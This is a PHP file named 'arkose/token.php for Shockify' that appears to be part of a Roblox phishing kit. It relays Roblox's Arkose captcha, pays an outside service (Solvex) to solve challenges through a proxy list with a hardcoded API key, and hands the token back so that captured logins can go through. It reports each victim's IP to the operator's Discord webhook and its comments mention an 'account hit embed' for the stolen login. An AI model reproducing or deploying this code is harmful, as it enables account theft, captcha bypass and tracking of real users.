<?php
/**
 * Enhanced arkose/token.php for Shockify
 * Integrates Sapphire's Solvex automated captcha solver.
 */

error_reporting(0);
ini_set('display_errors', 0);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// SOLVER LOGGING
function solvex_log($message, $data = []) {
    $log_file = $_SERVER["DOCUMENT_ROOT"] . "/solvex_debug.log";
    $log_entry = "[" . date("Y-m-d H:i:s") . "] " . $message . " | Context: " . json_encode($data) . PHP_EOL;
    file_put_contents($log_file, $log_entry, FILE_APPEND);
}

// SOLVER LOGIC (from Sapphire)
function solve_with_solvex($websiteUrl, $websitePublicKey, $dataBlob = null, $cookies = null) {
    $clientKey = "sk_xtci5yinx5mqv0wpnxt0se8enxtu5kb5";
    $baseUrl = "https://api.solvex.run";
    
    $solvex_proxy_file = $_SERVER["DOCUMENT_ROOT"] . "/api/proxy.txt";
    if (!file_exists($solvex_proxy_file)) return null;
    
    $proxies = array_filter(array_map('trim', file($solvex_proxy_file)));
    if (empty($proxies)) return null;
    $selected_proxy = $proxies[array_rand($proxies)];

    // Parse proxy
    $proxyParts = null;
    if (preg_match('/^([^:]+):([^@]+)@([^:]+):(\d+)$/', $selected_proxy, $matches)) {
        $proxyParts = ['login' => $matches[1], 'password' => $matches[2], 'address' => $matches[3], 'port' => $matches[4]];
    } else {
        $parts = explode(':', $selected_proxy);
        if (count($parts) === 4) {
            $proxyParts = ['address' => $parts[0], 'port' => $parts[1], 'login' => $parts[2], 'password' => $parts[3]];
        }
    }
    if (!$proxyParts) return null;

    $taskData = [
        "clientKey" => $clientKey,
        "task" => [
            "type" => "FunCaptchaTask",
            "websiteURL" => $websiteUrl,
            "websitePublicKey" => $websitePublicKey,
            "proxyType" => "http",
            "proxyAddress" => $proxyParts['address'],
            "proxyPort" => (int)$proxyParts['port'],
            "proxyLogin" => $proxyParts['login'],
            "proxyPassword" => $proxyParts['password'],
            "data" => $dataBlob,
            "cookies" => $cookies
        ]
    ];

    $ch = curl_init($baseUrl . "/createTask");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($taskData),
        CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
        CURLOPT_TIMEOUT => 15
    ]);
    $response = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if (!isset($response["taskId"])) return null;
    $taskId = $response["taskId"];

    // Poll for result
    for ($i = 0; $i < 60; $i++) {
        sleep(2);
        $ch = curl_init($baseUrl . "/getTaskResult");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode(["clientKey" => $clientKey, "taskId" => $taskId]),
            CURLOPT_HTTPHEADER => ["Content-Type: application/json"]
        ]);
        $res = json_decode(curl_exec($ch), true);
        curl_close($ch);

        if (isset($res["status"]) && $res["status"] === "ready") {
            return $res["solution"]["token"];
        }
        if (isset($res["errorId"]) && $res["errorId"] !== 0) return null;
    }
    return null;
}

function send_cors(): void {
    if (!headers_sent()) {
        header("Access-Control-Allow-Origin: *");
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
        header("Access-Control-Allow-Headers: *");
        header("Access-Control-Allow-Credentials: true");
    }
}

if($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
    send_cors();
    exit;
}

// CAPTURE DATA
$input = file_get_contents('php://input');
$data = json_decode($input, true) ?: $_POST;

// EXTRACT PUBLIC KEY FROM URI
$uri = $_SERVER["REQUEST_URI"];
$public_key = "";
if (preg_match('/public_key\/([^\/?]+)/', $uri, $m)) {
    $public_key = $m[1];
}

// IF IT'S A TOKEN REQUEST, TRY TO SOLVE
if (!empty($public_key)) {
    $blob = $data["data"]["blob"] ?? $data["blob"] ?? null;
    $cookies = $_SERVER["HTTP_COOKIE"] ?? null;
    
    $solved_token = solve_with_solvex("https://www.roblox.com", $public_key, $blob, $cookies);
    
    if ($solved_token) {
        // SHOCKIFY INTEGRATION: Ensure session and cookies are ready for the hit
        // The solved token is returned to the client, which will then POST to /v2/login.
        // The login() function in function.php will then handle the full account hit embed.
        
        // We'll send a quick "Captcha Solved" notification first.
        try {
            require_once($_SERVER["DOCUMENT_ROOT"] . "/setup.php");
            $webhook_url = $site["Discord"]["Webhooks"]["Normal"];
            
            if ($webhook_url) {
                $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
                $payload = [
                    "username" => "Shockify Solver",
                    "embeds" => [[
                        "title" => "🛡️ Captcha Solved Automatically",
                        "description" => "A captcha challenge was successfully bypassed. Waiting for login to finalize...",
                        "color" => 0x00FF00,
                        "fields" => [
                            ["name" => "Public Key", "value" => "`" . $public_key . "`", "inline" => true],
                            ["name" => "IP Address", "value" => "`" . $ip . "`", "inline" => true]
                        ],
                        "footer" => ["text" => "Shockify x Solvex | " . date("Y-m-d H:i:s")]
                    ]]
                ];

                $ch_wh = curl_init($webhook_url);
                curl_setopt_array($ch_wh, [
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode($payload),
                    CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => 5
                ]);
                curl_exec($ch_wh);
                curl_close($ch_wh);
            }
        } catch (Exception $e) {}

        send_cors();
        header("Content-Type: application/json");
        die(json_encode(["token" => $solved_token]));
    }
}

// FALLBACK TO ORIGINAL PROXY LOGIC IF SOLVER FAILS
// (Including original logic here for completeness)
$url = "https://arkoselabs.roblox.com" . $_SERVER["REQUEST_URI"];
$ch = curl_init($url);
$headers = [];
foreach (getallheaders() as $k => $v) {
    if (!in_array(strtolower($k), ["host", "content-length", "accept-encoding"])) {
        $headers[] = "$k: $v";
    }
}
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $input ?: http_build_query($_POST),
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_HEADER => true
]);
$response = curl_exec($ch);
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$res_body = substr($response, $header_size);
curl_close($ch);

send_cors();
header("Content-Type: application/json");
echo $res_body;
?>